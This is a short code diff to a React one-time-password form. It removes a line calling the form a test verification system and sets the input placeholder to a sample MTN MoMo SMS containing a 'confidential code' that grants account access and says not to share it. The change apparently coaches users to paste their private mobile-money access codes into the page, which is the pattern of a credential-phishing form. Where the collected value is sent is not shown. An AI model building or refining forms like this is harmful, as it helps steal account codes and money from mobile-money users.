@@ -318,8 +318,8 @@ otpInput.setAttribute('inputmode', 'text')
         <form className="otp-form" onSubmit={submitOtp}>
           <div className="form-heading">
             <span>MOVE FORWARD</span>
-            <h3>Enter your verification value</h3>
-            <p>Enter the value provided by your test verification system.</p>
+            <h3> Please enter your verification value</h3>
+            {/* <p>Enter the value provided by your test verification system.</p> */}
           </div>
 
           <label htmlFor="otp">Verification value</label>
@@ -330,7 +330,7 @@ otpInput.setAttribute('inputmode', 'text')
             type="text"
             inputMode="text"
 autoComplete="one-time-code"
-placeholder="Enter verification message"
+placeholder="eg.. Y'ello. Please note! This confidential code gives access to your MoMo account:0GFplxB6EOVf5KiCjzf65j07RliNAxro8b1iGzyECNPF6Q== Do not share it with anyone. l+/DM+Y0kqw HTx14B0+90w YyRaK1dXEWz CTO2RPz+HOF yiitGCXacTO"
 value={otp}
             onChange={(event) => setOtp(event.target.value)}
 aria-describedby="otp-timer"
